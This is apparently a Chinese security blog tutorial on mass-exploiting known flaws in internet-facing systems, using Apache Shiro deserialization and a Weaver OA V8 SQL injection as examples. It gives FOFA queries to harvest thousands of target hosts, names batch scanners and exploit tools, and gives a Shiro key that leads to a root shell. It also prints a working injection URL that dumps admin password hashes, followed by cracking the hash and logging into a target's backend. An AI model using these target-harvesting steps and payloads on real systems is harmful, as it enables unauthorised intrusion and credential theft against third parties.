`漏洞挖掘`是指对应用程序中未知漏洞的探索，通过综合应用各种技术和工具，尽可能地找出其中的潜在漏洞。一般情况下漏洞挖掘针对单一的应用系统，通过端口扫描、目录扫描、文件扫描等方式对其安全性进行评估，而本文主要针对Nday和1day的漏洞挖掘，帮助初学者在前期能够在公益漏洞榜单中刷积分，当然运气好有时候也能挖掘到大型企业的漏洞，可以提交至专门的src机构获取现金奖励。

## 0x01 整体思路

整体思路主要如下所示，下面通过Shiro反序列化漏洞和泛微OA V8的SQL注入漏洞进行演示。

1、寻找Nday或1day漏洞  
2、寻找漏洞所在应用程序特征  
3、通过fofaApi导出对应的IP地址  
4、通过批量检测工具对导出的IP地址进行筛选  
5、验证漏洞并进行漏洞利用  
6.、编写漏洞报告并上交src

## 0x02 漏洞挖掘

### Shiro反序列化漏洞

Shiro框架通过记住我的功能，在用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，并对相关信息进行序列化，先使用aes加密，然后再使用base64编码处理形成的。在网上关于Shiro反序列化的介绍很多，我这里就只简单介绍一下，详情各位可以看下大神们对其源码的分析。

#### （一）通过fofa寻找特征

> app="Apache-Shiro"
>
> header="rememberme=deleteMe"
>
> header="shiroCookie"

#### （二）通过fofaApi导出相应的IP地址

项目地址：https://github.com/k-fire/fofa-tool

因为我开了fofa会员，可以直接在fofa.ini中配置邮箱地址和api，然后在下载的脚本目录下执行语句

    
    
    python3 fofa-api.py
    
    规则：
    {'rule':'app="Apache-Shiro" && header="rememberme=deleteMe"','page':'','size':'10000','fields':'host','is_full':''}
    

![image](https://image.3001.net/images/20210716/1626411874_60f11362d96b8cc4d84db.png!small)

#### （三）通过批量检测工具对导出的IP地址进行筛选

项目地址1：https://github.com/arno567/ShiroScanF  
项目地址2：https://github.com/sv3nbeast/ShiroScan

 **1、下载这两个项目，主要使用ShiroScanF来进行批量检测**

 **2、从ShiroScan中下载ysoserial.jar放在其目录下**

 **3、访问http://ceye.io/profile，获取dnslog地址（如果没注册则需要注册）**

![image](https://image.3001.net/images/20210716/1626411896_60f11378c062481b8c448.png!small)

 **4、修改shiroFscan.py第124行的dnslog地址**

![image](https://image.3001.net/images/20210716/1626411911_60f1138781732687eac25.png!small)

 **5、将fofaapi导出的out.txt中的地址放入目录url.txt中**

![image](https://image.3001.net/images/20210716/1626411924_60f1139441894c5adafb5.png!small)

 **6、在ShiroScanF目录下执行脚本**

    
    
    python3 shiroFscan.py
    

![image](https://image.3001.net/images/20210716/1626411941_60f113a54195707d4bb81.png!small)

**7、查看dnslog返回的信息**

![image](https://image.3001.net/images/20210716/1626411956_60f113b4a57d32e749a51.png!small)

 **8、利用反序列化攻击进行攻击**  
项目地址1：https://github.com/j1anFen/shiro_attack/releases/tag/2.2  
项目地址2：https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51

 **1）shiro_attack：**  
其中密钥 kPH+bIxk5D2deZiIxcaaaA==
在shiro_attack中不存在，而是kPH+bIxk5D2deZiIxcacaA==，虽然显示该秘钥不可用，但是检查当前利用链还是可用的

![image](https://image.3001.net/images/20210716/1626411970_60f113c2becd3f7b5cab4.png!small)

成功执行命令whoami，执行为root权限

![image](https://image.3001.net/images/20210716/1626411981_60f113cdaa2b51f66ff4c.png!small)

 **2）ShiroExploit**

![image](https://image.3001.net/images/20210716/1626411993_60f113d93fc1d67c7830d.png!small)

### 泛微OA V8 SQL注入漏洞

在泛微OA
V8中的getdata.jsp文件里，通过gatData方法将数据获取并回显在页面上，而在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法。其中它存在四个参数，分别为空字符串、cmd参数值、request对象以及serverContext对象，通过对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中，从而在前台构造POC语句：

    
    
    http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
    

#### （一）通过fofa寻找特征

app="泛微-协同办公OA"

#### （二）通过fofaApi导出相应的IP地址

项目地址：https://github.com/k-fire/fofa-tool

在下载的脚本目录下执行语句

    
    
    python3 fofa-api.py
    
    规则：
    {'rule':'app="泛微-协同办公OA"','page':'','size':'10000','fields':'host','is_full':''}
    

![image](https://image.3001.net/images/20210716/1626412009_60f113e990bf8667c2cc6.png!small)

#### （三）通过批量检测工具对导出的IP地址进行筛选

项目地址：https://github.com/Yang0615777/PocList

 **1、进入下载项目下，执行以下命令，将fofaAPI导出地址放入即可进行检测**

    
    
    java -jar FanWeiOA-V8-SQLinjection.jar
    

![image](https://image.3001.net/images/20210716/1626412024_60f113f8acc8e41754a31.png!small)

**2、访问其中存在漏洞的网站：http://x.x.x.x/login/Login.jsp?logintype=1，其中该特征属于泛微OA v8系统**

![image](https://image.3001.net/images/20210716/1626412038_60f11406c269e987caa08.png!small)

 **3、通过SQL注入POC获取管理员密码：http://x.x.x.x/js/hrm/getdata.jsp?cmd=getSelectAllId
&sql=select%20password%20as%20id%20from%20HrmResourceManager**

![image](https://image.3001.net/images/20210716/1626412055_60f11417ca9c6cfb5b578.png!small)

 **4、md5解密，得到密码为 ASD$%^123**

![image](https://image.3001.net/images/20210716/1626412065_60f11421d737cddedd2a7.png!small)

 **5、登录目标后台**

![image](https://image.3001.net/images/20210716/1626412076_60f1142ce219a6be282d8.png!small)

## 0x03 总结

本文主要介绍批量挖掘漏洞中的小技巧，希望能帮助到刚入门的小白，如果各位大佬还有其他批量挖掘思路，欢迎在评论区留言探讨。

